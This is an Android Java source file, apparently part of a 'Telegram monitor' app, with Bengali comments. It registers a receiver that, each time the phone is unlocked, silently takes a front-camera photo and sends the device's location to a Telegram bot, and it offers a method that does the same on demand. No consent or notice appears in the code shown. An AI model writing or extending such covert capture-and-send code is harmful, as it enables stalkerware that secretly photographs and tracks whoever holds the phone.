package com.nehal.telegrammonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

public class AlertSender extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
            // ফোন আনলক হলেই নিচের দুইটা কাজ হবে
            new Handler().postDelayed(() -> {
                // ফ্রন্ট ক্যামেরা দিয়ে ছবি তোলো
                CameraHelper.captureFront(context, BotService.BOT_TOKEN, BotService.CHAT_ID);
                // লোকেশন পাঠাও
                LocationHelper.sendLocation(context, BotService.BOT_TOKEN, BotService.CHAT_ID);
            }, 1000); // 1 সেকেন্ড delay
        }
    }

    // ম্যানুয়ালি কল করার জন্য
    public static void sendUnlockAlert(Context context, String token, String chatId) {
        CameraHelper.captureFront(context, token, chatId);
        LocationHelper.sendLocation(context, token, chatId);
    }
}